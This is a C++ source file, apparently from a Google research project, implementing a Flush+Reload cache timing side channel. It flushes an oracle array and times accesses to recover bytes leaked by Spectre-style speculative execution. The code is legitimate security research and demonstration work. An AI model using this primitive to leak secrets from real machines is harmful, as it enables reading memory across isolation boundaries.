/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "cache_sidechannel.h"

#include <algorithm>
#include <list>
#include <tuple>
#include <vector>

#include "instr.h"

// Returns the indices of the biggest and second-biggest values in the range.
template <typename RangeT>
static std::pair<size_t, size_t> top_two_indices(const RangeT &range) {
  std::pair<size_t, size_t> result = {0, 0};  // first biggest, second biggest
  for (size_t i = 0; i < range.size(); ++i) {
    if (range[i] > range[result.first]) {
      result.second = result.first;
      result.first = i;
    } else if (range[i] > range[result.second]) {
      result.second = i;
    }
  }
  return result;
}

const std::array<BigByte, 256> &CacheSideChannel::GetOracle() const {
  return padded_oracle_array_->oracles_;
}

void CacheSideChannel::FlushOracle() const {
  // Flush out entries from the timing array. Now, if they are loaded during
  // speculative execution, that will warm the cache for that entry, which
  // can be detected later via timing analysis.
  for (BigByte &b : padded_oracle_array_->oracles_) {
    CLFlush(&b);
  }
}

std::pair<bool, char> CacheSideChannel::RecomputeScores(
    std::set<char> architectural_hits) {
  static size_t additional_offset_counter = 0;

  // If there are no architectural hits, we add a new one artificially.
  if (architectural_hits.empty()) {
    size_t mixed_i = ((additional_offset_counter * 167) + 13) & 0xFF;
    architectural_hits.insert(static_cast<char>(mixed_i));
    ForceRead(&GetOracle()[mixed_i]);
    additional_offset_counter = (additional_offset_counter + 1) % 256;
  }

  char safe_offset_char = *architectural_hits.begin();

  std::array<uint64_t, 256> latencies = {};
  size_t best_val = 0, runner_up_val = 0;

  // Here's the timing side channel: find which char was loaded by measuring
  // latency. Indexing into isolated_oracle causes the relevant region of
  // memory to be loaded into cache, which makes it faster to load again than
  // it is to load entries that had not been accessed.
  // Along with members of architectural_hits there has been a speculatively
  // accessed offset that we want to detect.
  // Note: if the speculatively accessed offset is in architectural_hits, the
  // data from this run will be useless, but later runs will use a different
  // architecturally accessed offsets.
  for (size_t i = 0; i < 256; ++i) {
    // Some CPUs (e.g. AMD Ryzen 5 PRO 2400G) prefetch cache lines, rendering
    // them all equally fast. Therefore it is necessary to confuse them by
    // accessing the offsets in a pseudo-random order.
    size_t mixed_i = ((i * 167) + 13) & 0xFF;
    const void *timing_entry = &GetOracle()[mixed_i];
    latencies[mixed_i] = ReadLatency(timing_entry);
  }

  std::list<uint64_t> sorted_latencies_list(latencies.begin(), latencies.end());
  // We have to used the std::list::sort implementation, because invocations of
  // std::sort, std::stable_sort, std::nth_element and std::partial_sort when
  // compiled with optimizations intervene with the neural network based AMD
  // memory disambiguation dynamic predictor and the Spectre v4 example fails
  // on AMD Ryzen 5 PRO 2400G.
  sorted_latencies_list.sort();
  std::vector<uint64_t> sorted_latencies(sorted_latencies_list.begin(),
                                         sorted_latencies_list.end());

  uint64_t median_latency = sorted_latencies[128];

  // The difference between a cache-hit and cache-miss times is significantly
  // different across platforms. Therefore we must first compute its estimate
  // using the safe_offset which should be a cache-hit.
  uint64_t hitmiss_diff = median_latency - latencies[safe_offset_char];
  int hitcount = 0;
  for (size_t i = 0; i < 256; ++i) {
    if (latencies[i] < median_latency - hitmiss_diff / 2 &&
        architectural_hits.find(
            static_cast<char>(i)) == architectural_hits.end()) {
      ++hitcount;
    }
  }

  // If there is not exactly one hit, we consider that sample invalid and
  // skip it.
  if (hitcount == 1) {
    for (size_t i = 0; i < 256; ++i) {
      if (latencies[i] < median_latency - hitmiss_diff / 2 &&
          architectural_hits.find(
              static_cast<char>(i)) == architectural_hits.end()) {
        ++scores_[i];
      }
    }
  }

  std::tie(best_val, runner_up_val) = top_two_indices(scores_);
  return std::make_pair((scores_[best_val] > 2 * scores_[runner_up_val] + 40),
                        best_val);
}
